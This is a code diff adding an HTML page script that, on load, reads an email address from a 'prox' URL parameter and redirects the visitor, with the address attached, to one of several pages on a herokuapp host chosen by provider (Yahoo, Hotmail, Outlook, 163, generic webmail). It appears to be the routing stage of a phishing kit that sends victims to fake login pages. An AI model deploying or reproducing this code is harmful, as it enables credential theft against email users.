@@ -1,0 +1,36 @@
+<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
+<script type="text/javascript">
+$(window).on('load', function() {
+ // code here
+
+var docurl = '';
+	const queryString = window.location.search;
+	console.log(queryString);	
+	const urlParams = new URLSearchParams(queryString);	
+	const str = urlParams.get('prox')
+	var proxx = str.substring(0, 4); 
+    var results =str.split('@');
+	var result = results[1];
+	var identifyexten = result.substring(0, 3);
+	var cplete = identifyexten.toUpperCase();
+	
+				if(cplete == "YAH"){
+					window.location = 'https://go-limitless-anchorage-55.herokuapp.com/yahinde.html?prox='+str;
+															
+				}else if(cplete == "HOT"){
+					window.location = 'https://go-limitless-anchorage-55.herokuapp.com/offnew.html?prox='+str;
+															
+				}else if(cplete == "OUT"){
+					window.location = 'https://go-limitless-anchorage-55.herokuapp.com/offnew.html?prox='+str;
+															
+				}else if(cplete == "163"){
+					window.location = 'https://go-limitless-anchorage-55.herokuapp.com/r1633.html?prox='+str;
+															
+				}else{
+					window.location = 'https://go-limitless-anchorage-55.herokuapp.com/wbmad.html?prox='+str;
+															
+				}
+});				
+</script> 
+
+
